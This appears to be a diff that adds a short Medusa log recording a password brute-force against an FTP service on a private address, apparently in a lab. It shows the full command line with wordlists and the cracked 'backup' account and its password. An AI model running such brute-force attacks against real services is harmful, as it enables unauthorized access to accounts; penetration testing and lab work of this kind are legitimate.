@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2026-10-29 14:49:57)
+# medusa -h 172.28.0.10 -U /wordlists/tmp-backup-user.txt -P /wordlists/trial1-passwords.txt -M ftp -t 20 -v 4 -O /logs/medusa-ftp-20261029-114957.log -f 
+2026-10-29 14:50:07 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: backup Password: 12ab [SUCCESS]
+# Medusa has finished (2026-10-29 14:50:07).
